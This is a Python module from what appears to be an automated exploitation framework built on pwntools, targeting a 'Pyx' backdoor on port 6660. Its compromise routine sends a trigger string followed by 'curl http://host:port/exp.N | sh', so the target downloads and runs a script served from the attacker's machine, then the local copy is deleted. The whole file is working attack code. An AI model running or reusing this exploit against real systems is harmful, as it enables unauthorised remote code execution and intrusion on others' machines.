#!/usr/bin/python3

from .base import Module
import socket
import time
from pwnlib.tubes.remote import remote
from pwnlib.tubes.listen import listen
from pwnlib.exception import PwnlibException
from ..payloads.basicpayload import BasicPayload
from ..utils.encoding import hex_reprb
from ..utils import common, logging
import random
import os


class PyxBackdoor(Module):
    """Exploits Pyx backdoor (Secondary Module)"""

    payload = BasicPayload() # No payload required

    def detect(self, target):
        """Detect a small change in the banner signifying compromise

           Also detect if there was already a shell running, if so close it.
        """
        try:
            s = remote(target['ip'], 6660, timeout=0.25)
            banner = s.recvuntil(".")

            return s
        except:
            return None

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # detect_val should be socket we used to test for compromise
        # Saves an open socket

        payload = self.payload

        try:
            num = random.randrange(100000)
            script = self.payload.generate_script(prefix="")
            open("exp.%d" % num, 'w').write(script)
            detect_val.sendline("DoYouHearThePeopleSing?:::curl http://%s:%d/%s | sh"
                                % (common.host_ip, common.http_port,
                                   "exp.%d" % num))
            detect_val.close()
            time.sleep(0.5)
            os.remove("exp.%d" % num)

            logging.success(target, "Pyx backdoor exploited.")
        except PwnlibException:
            logging.failure(target, "Pyx backdoor patched.")
        except:
            import traceback
            traceback.print_exc()

        return True

